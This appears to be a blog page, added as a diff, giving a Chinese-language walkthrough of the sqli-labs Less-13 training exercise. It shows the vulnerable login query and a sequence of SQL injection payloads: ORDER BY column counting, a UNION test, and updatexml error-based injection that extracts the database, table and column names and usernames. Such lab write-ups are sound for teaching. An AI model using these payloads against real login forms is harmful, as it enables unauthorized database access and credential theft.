@@ -1,0 +1,24 @@
+<hr>
+<h2 id="title-less13url-https-www-yuque-com-u29002979-ep2zrx-fgtmtrfgkke6rm22"><a href="#title-less13url-https-www-yuque-com-u29002979-ep2zrx-fgtmtrfgkke6rm22" class="headerlink" title="title: less13url: https://www.yuque.com/u29002979/ep2zrx/fgtmtrfgkke6rm22"></a>title: less13<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/fgtmtrfgkke6rm22">https://www.yuque.com/u29002979/ep2zrx/fgtmtrfgkke6rm22</a></h2><pre><code class="bash">@$sql=&quot;SELECT username, password FROM users WHERE username=(&#39;$uname&#39;) and password=(&#39;$passwd&#39;) LIMIT 0,1&quot;;
+</code></pre>
+<p>与Less12的唯一区别为闭合方式为**’)** &amp;#x20;<br><code>1&#39;)</code> <a name="nEKcR"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>用<strong>updatexml()函数</strong>进行报错注入 &amp;#x20;<br>updatexml（1，2，3）</p>
+<pre><code class="bash">查询字段数
+1&#39;) order by 3-- + 
+登录后页面报错Unknown column &#39;3&#39; in &#39;order clause&#39;
+1&#39;) order by 2-- +
+没有提示错误，说明有2个字段；
+
+判断回显点
+1&#39;) union select 1,2 -- +
+没有显示1，2
+
+查询数据库表
+-1&#39;) or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
+爆破数据表
+-1&#39;) or updatexml(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e),1) -- +
+爆破字段名
+-1&#39;) or updatexml(1,concat(0x7e,(select (column_name)from information_schema.columns where table_name=&#39;users&#39; limit 8,1),0x7e),1) -- +
+爆破字段
+-1&#39;) or updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) -- +
+</code></pre>
